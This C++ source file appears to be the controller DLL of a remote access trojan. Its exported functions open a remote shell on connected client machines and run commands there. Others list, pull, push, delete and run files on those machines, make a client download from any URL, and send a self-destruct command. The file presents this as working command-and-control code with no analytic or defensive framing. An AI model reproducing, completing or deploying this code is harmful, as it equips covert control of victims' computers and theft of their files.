// master.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <algorithm>
#include "CommManager.h"
#include "file/MyFile.h"
#include "common.h"
#include "ShellManager.h"
#include "LocalFileOperation.h"
#include "RemoteFileOperation.h"
#include "ClientInfoManager.h"
#include "ClientmodManager.h"
#include "FileTransfer.h"
#include "HttpDown.h"

#include "MessageDefines.h"
#include "MessageRecorder.h"
#include "master.h"
#include "Exports.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

static tstring g_fileServerUrlListStr;

static BOOL InitMaster()
{
	static BOOL bInitOK = FALSE;
	if (bInitOK) return TRUE;

	if (! CommManager::GetInstanceRef().Init())
	{
		errorLog(_T("init comm manager failed"));
		return FALSE;
	}
	
	if (! ClientInfoManager::GetInstanceRef().Init())
	{
		errorLog(_T("init clientinfo manager failed"));
		return FALSE;
	}

	if (! ShellManager::GetInstanceRef().Init())
	{
		errorLog(_T("init ShellManager failed"));
		return FALSE;
	}

	if (! ClientmodManager::GetInstanceRef().Init())
	{
		errorLog(_T("init clientmodmanager failed"));
		return FALSE;
	}

	if (! CFileTransfer::GetInstanceRef().Init())
	{
		errorLog(_T("init CFileTransfer failed"));
		return FALSE;
	}

	bInitOK = TRUE;

	return TRUE;
}

void DeinitMaster()
{
	ClientInfoManager::GetInstanceRef().Deinit();

	CommManager::GetInstanceRef().Deinit();

	ClientmodManager::GetInstanceRef().Deinit();
}

BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		InitMaster();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		DeinitMaster();
		break;
	}

	return TRUE;
}


static RemoteFileOperation g_rfo;
static LocalFileOperation g_lfo;

static DWORD WINAPI ListFileThread(LPVOID lpParameter)
{
	LIST_FILE_PARAMETER* pParam = (LIST_FILE_PARAMETER*) lpParameter;
	FileInfoList fileInfoList;
	CStringA strPath = CStringA(pParam->findstr.c_str());
	BOOL bOK = pParam->pFo->ListClientFiles(pParam->clientid.c_str(), pParam->findstr.c_str(), fileInfoList, pParam->bForce);
	if (bOK) 
	{
		Json::Value root;
		FileInfoList::iterator iter = fileInfoList.begin();
		for (; iter != fileInfoList.end(); iter++)
		{
			Json::Value info;
			info["filename"] = t2a(iter->filename);
			info["filetype"] = iter->IsDir() ? "dir" : "file";
			CStringA size;
			size.Format("%I64u", iter->filesize);
			info["size"] = (LPCSTR)size;

			__time64_t lastWriteTime = 0;
			Filetime2Time(iter->lastWriteTime, &lastWriteTime);
			CStringA edittime;
			edittime.Format("%I64u", lastWriteTime);
			info["edittime"] = (LPCSTR)edittime;
			info["dir"] = (LPCSTR)strPath;
			root.append(info);
		}

		Json::FastWriter fastWriter;
		std::string retjson = fastWriter.write(root);

		int nMsg = pParam->pFo == &g_rfo ? MODULE_MSG_LISTREMOTEFILE : MODULE_MSG_LISTLOCALFILE;

		pParam->fnProc(pParam->clientid.c_str(),nMsg,(LPVOID)retjson.c_str(),pParam->lpParameter1);
	}

	delete pParam;

	return 0;
}

static DWORD WINAPI ListDiskThread(LPVOID lpParameter)
{
	LIST_DISK_PARAMETER* pParam = (LIST_DISK_PARAMETER*) lpParameter;
	DiskInfoList diskInfoList;
	BOOL bOK = pParam->pFO->ListClientDisks(pParam->clientid.c_str(), diskInfoList);
	if (bOK) 
	{
		Json::Value root;
		DiskInfoList::iterator iter = diskInfoList.begin();
		for (; iter != diskInfoList.end(); iter++)
		{
			Json::Value info;
			std::string partition;
			partition += iter->partition;
			partition += ":";

			switch(iter->driverType)
			{
			case DRIVE_UNKNOWN:
				partition += "unknown";
				break;
			case DRIVE_NO_ROOT_DIR:
				partition += "(NoRootDir)";
				break;
			case DRIVE_REMOTE:
				partition += "(Remote)";
				break;
			case DRIVE_RAMDISK:
				partition += "(RAMDisk)";
				break;
			case DRIVE_CDROM:
				partition += "(CDROM)";
				break;
			case DRIVE_REMOVABLE:
				partition += "(Removable)";
				break;
			case DRIVE_FIXED:
				break;
			}

			info["filename"] = partition.c_str();
			info["filetype"] = "disk";
			CStringA size;
			size.Format("%I64u", iter->totalBytes - iter->freeBytes);
			info["size"] = (LPCSTR)size;
			CStringA edittime;
			edittime.Format("%I64u", iter->totalBytes);
			info["edittime"] = (LPCSTR)edittime;
			info["dir"] = (LPCSTR)"";
			root.append(info);
		}

		Json::FastWriter fastWriter;
		std::string retjson = fastWriter.write(root);

		int nMsg = pParam->pFO == &g_rfo ? MODULE_MSG_LISTREMOTEFILE : MODULE_MSG_LISTLOCALFILE;

		pParam->fnProc(pParam->clientid.c_str(),nMsg,(LPVOID)retjson.c_str(),pParam->lpParameter1);
	}

	delete pParam;

	return 0;
}


//******************** 导出接口便利函数 ***************************
static DWORD			g_lastError;
static ULONG			g_dwWaitReplyTimeoutS = 10;

static void SetMasterLastError(DWORD errorNO)
{
	g_lastError = errorNO;
}

static BOOL WaitForReply(LPCTSTR clientid, MSGSERIALID msgSerialID, CommData& replyData)
{
	//等待回应
	DWORD dwSleepMS = 200;
	BOOL bReplied = FALSE;
	for (int i = 0; i < (int)(g_dwWaitReplyTimeoutS * 1000 / dwSleepMS); i++)
	{
		Sleep(dwSleepMS);

		if (CommManager::GetInstanceRef().GetReplyMessage(clientid, msgSerialID, replyData))
		{
			bReplied = TRUE;
			break;
		}
	}

	//如果超时
	if (! bReplied)
	{
		SetMasterLastError(MASTERROR_REPLY_TIMEOUT);
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}

//***************************** 导出接口的实现 **********************************
MASTER2_API DWORD GetMasterLastError()
{
	return g_lastError;
}

MASTER2_API LPCTSTR GetMasterErrorMsg( DWORD dwLastError )
{
	switch (dwLastError)
	{
	case MASTERROR_REPLY_SUCCESS:
		return _T("没有错误");
		break;
	case MASTERROR_REPLY_TIMEOUT:
		return _T("接收回应超时");
		break;
	case MASTERROR_NO_EXPECTED_DATA:
		return _T("在回应数据中没有找到需要的部分");
		break;
	}

	return _T("未知错误");
}

MASTER2_API void ListAvailableClients( MyStringList* pClientidList )
{
	if (NULL == pClientidList) return;

	TStringVector clientidList;
	CommManager::GetInstanceRef().ListAvailableClient(clientidList);

	pClientidList->Alloc(clientidList.size());
	TStringVector::iterator iter = clientidList.begin();
	for (int i = 0; iter != clientidList.end(); iter++, i++)
	{
		pClientidList->At(i) = iter->c_str();
	}
}

MASTER2_API BOOL OpenShell(LPCTSTR clientid, FnRemoteCmdOutput fnRemoteCmdOutput, LPVOID lpParameter)
{
	return ShellManager::GetInstanceRef().OpenShell(clientid, fnRemoteCmdOutput, lpParameter);
}

MASTER2_API BOOL ExecuteShellCommand(LPCTSTR clientid, LPCTSTR cmdline, BOOL bAddRN/* = TRUE*/)
{
	CmdShell* pShell = ShellManager::GetInstanceRef().GetShell(clientid);
	if (NULL == pShell) return FALSE;

	return pShell->ExecuteCmd(cmdline, bAddRN);
}

MASTER2_API void CloseShell(LPCTSTR clientid)
{
	ShellManager::GetInstanceRef().CloseShell(clientid);
}

MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, FnModuleNotifyProc callback ,LPVOID lpParameter )
{
	LIST_FILE_PARAMETER* pData = new LIST_FILE_PARAMETER;

	pData->pFo = isClient ? (IRCFileOperation*)&g_rfo : (IRCFileOperation*)&g_lfo;
	pData->clientid = clientid;
	pData->findstr = findstr;
	pData->lpParameter1 = lpParameter;
	pData->fnProc = callback;

	DWORD dwThreadId;
	CreateThread(NULL,0,ListFileThread, pData,0, &dwThreadId);
}
MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, FnModuleNotifyProc callback , LPVOID lpParameter )
{
	LIST_DISK_PARAMETER* pData = new LIST_DISK_PARAMETER;
	pData->lpParameter1 = lpParameter;
	pData->fnProc = callback;

	pData->pFO = isClient ? (IRCFileOperation*)&g_rfo : (IRCFileOperation*)&g_lfo;

	pData->clientid = clientid;

	DWORD dwThreadId;
	CreateThread(NULL,0,ListDiskThread, pData,0, &dwThreadId);
}

MASTER2_API int AddCommService(int port,int name)
{
	return CommManager::GetInstanceRef().AddCommService(port,name);
}

MASTER2_API BOOL DeleteCommService(int serialid)
{
	return CommManager::GetInstanceRef().DeleteCommService(serialid);
}


MASTER2_API BOOL MakeClientSelfDestruction( LPCTSTR clientid )
{
	if (NULL == clientid) return FALSE;

	CommData sendData;
	sendData.SetMsgID(MSGID_SELF_DESTRUCTION);

	MSGSERIALID serialID = CommManager::GetInstanceRef().AddToSendMessage(clientid, sendData, FALSE);
	if (INVALID_MSGSERIALID == serialID)
	{
		errorLog(_T("add to send msg failed"));
		return FALSE;
	}

	return TRUE;
}

MASTER2_API void SetClientInfoNotifies( FnNotifyProc fnNotify, LPVOID lpParameter )
{
	ClientInfoManager::GetInstanceRef().SetCallbacks(fnNotify, lpParameter);
}
MASTER2_API void StopMasterWorking()
{
//	return CommManager::GetInstanceRef().Stop();
}
MASTER2_API BOOL StartMasterWorking()
{
	if (! ClientInfoManager::GetInstanceRef().StartWorking())
	{
		errorLog(_T("start clientinfo manager failed"));
		return FALSE;
	}

	return TRUE;
}

MASTER2_API void ListAvailableClientModules( MyStringList* pModulenameList )
{
	if (NULL == pModulenameList) return;

	TStringVector nameList;
	ClientmodManager::GetInstanceRef().ListAllModuleNames(nameList);

	pModulenameList->Alloc(nameList.size());
	TStringVector::iterator iter = nameList.begin();
	for (int i = 0; iter != nameList.end(); iter++, i++)
	{
		pModulenameList->At(i) = iter->c_str();
	}
}

MASTER2_API BOOL GetClientInfo( LPCTSTR clientid, CLIENT_INFO* clientInfo )
{
	CLIENT_BASE_INFO baseInfo;
	if (! ClientInfoManager::GetInstanceRef().GetClientBaseInfo(clientid, baseInfo))
	{
		errorLog(_T("get client base info failed[%s]"), clientid);
		return FALSE;
	}

	ClientInfoManager::GetInstanceRef().TransferInfo(clientid,&baseInfo,*clientInfo);

	return TRUE;
}

MASTER2_API MSGSERIALID SendMessage2Client( LPCTSTR clientid, const LPBYTE pData, DWORD dwSize, BOOL bNeedReply )
{
	if (NULL == clientid || NULL == pData || 0 == dwSize) return INVALID_MSGSERIALID;

	CommData commData;
	if (! commData.Parse(pData, dwSize))
	{
		errorLog(_T("parse commdata in SendMessage2Client failed.[%s]"), clientid);
		return INVALID_MSGSERIALID;
	}

	return CommManager::GetInstanceRef().AddToSendMessage(clientid, commData, bNeedReply);
}

MASTER2_API BOOL GetReplyByMsgserialid( LPCTSTR clientid, MSGSERIALID sendMsgserialid, ByteList* pByteList )
{
	if (NULL == clientid || NULL == pByteList) return FALSE;

	CommData reply;
	if (! CommManager::GetInstanceRef().GetReplyMessage(clientid, sendMsgserialid, reply))
	{
		debugLog(_T("no reply for [%s][%I64u] yet"), clientid, sendMsgserialid);
		return FALSE;
	}

	ByteBuffer byteData;
	reply.Serialize(byteData);
	pByteList->Alloc(byteData.Size());
	memcpy(pByteList->GetPointer(), (LPBYTE)byteData, byteData.Size());

	return TRUE;
}

MASTER2_API void RegisterCommMsgHandler( MSGID msgid, FnMsgHandler fnHandler, LPVOID lpParameter )
{
	CommManager::GetInstanceRef().RegisterMsgHandler(msgid, fnHandler, lpParameter);
}

/***********************文件管理API***********************************/

MASTER2_API BOOL PutFileToClient( LPCTSTR clientid,LPCTSTR serverpath,LPCTSTR clientpath )
{
	return CFileTransfer::GetInstanceRef().RequestPutFile(clientid,clientpath,serverpath);
}

MASTER2_API BOOL GetFileToServer( LPCTSTR clientid,LPCTSTR clientpath,LPCTSTR serverpath )
{
	return CFileTransfer::GetInstanceRef().RequestGetFile(clientid,clientpath,serverpath);
}

MASTER2_API void QueryTransferStatus(LPCTSTR clientid,FnQueryTrans fn,LPVOID lpParameter)
{
	TransStatusVector vec;
	CFileTransfer::GetInstanceRef().GetTransferList(clientid,vec);


	TransStatusVector::iterator iter = vec.begin();
	for (int i = 0; iter != vec.end(); iter++, i++)
	{
		if (fn)
		{
			fn(clientid,iter->second,lpParameter);
		}
	}

}

MASTER2_API BOOL StartFileTransfer( LPCTSTR clientid ,TRANS_STATUS& status )
{
	CFileTransfer::GetInstanceRef().DeleteStopList(status.strSPath);

	if (status.isDown)
	{
		return CFileTransfer::GetInstanceRef().RequestGetFile(clientid,status.strCPath,status.strSPath);
	}
	else
	{
		return CFileTransfer::GetInstanceRef().RequestPutFile(clientid,status.strCPath,status.strSPath);
	}
}

MASTER2_API BOOL StopFileTransfer( LPCTSTR clientid ,TRANS_STATUS& status )
{
	return CFileTransfer::GetInstanceRef().AddStopList(status.strSPath);
}

MASTER2_API BOOL DeleteFileTransfer( LPCTSTR clientid ,TRANS_STATUS& status )
{
	return CFileTransfer::GetInstanceRef().DeleteTransferInfo(clientid,status);
}

MASTER2_API BOOL IsHasStop ( LPCTSTR clientid ,TRANS_STATUS& status )
{
	return CFileTransfer::GetInstanceRef().IsHasStop(status.strSPath);
}

MASTER2_API void DeleteRemoteFile(LPCTSTR clientid,LPCTSTR clientpath)
{
	CommData commData;
	commData.SetMsgID(MSGID_DELETE_FILE);
	commData.SetData(_T("clientpath"),clientpath);

	MSGSERIALID serialID = CommManager::GetInstanceRef().AddToSendMessage(clientid, commData, FALSE);

	if (INVALID_MSGSERIALID == serialID)
	{
		errorLog(_T("add to send msg failed"));
	}
}

MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath)
{
	CommData commData;
	commData.SetMsgID(MSGID_RUN_FILE);
	commData.SetData(_T("clientpath"),clientpath);

	MSGSERIALID serialID = CommManager::GetInstanceRef().AddToSendMessage(clientid, commData, FALSE);

	if (INVALID_MSGSERIALID == serialID)
	{
		errorLog(_T("add to send msg failed"));
	}
}

/***********************模块功能API***********************************/
MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path)
{
	return CHttpDown::GetInstanceRef().Down(clientid,url,path);
}